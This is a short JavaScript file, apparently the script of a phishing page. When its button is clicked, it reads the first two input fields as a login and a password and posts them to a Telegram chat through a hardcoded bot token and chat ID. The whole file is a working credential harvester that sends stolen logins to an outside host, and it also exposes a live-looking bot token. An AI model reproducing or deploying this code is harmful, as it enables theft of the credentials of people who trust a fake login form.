let BOT_TOKEN = '8779624099:AAH1qLPxWLeLNWB0a5oTkpnCnHjtCGk4tN8'

let input = document.querySelectorAll('input')
let button = document.querySelector('button') 

let CHAT_ID = '5495774202'

const send = async (message) => {
    try{
let request = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: 'POST',
headers:{
    'Content-type': 'application/json'
},
body: JSON.stringify({
    chat_id: CHAT_ID,
    text: message
})
})
    } catch (error){
console.log('ishlamadi:', error );

    }
}

button.addEventListener('click', (e) => {
   e.preventDefault()
   let xabar = `\n
   login: ${input[0].value}
   password: ${input[1].value}
   ` 
   send(xabar)
})


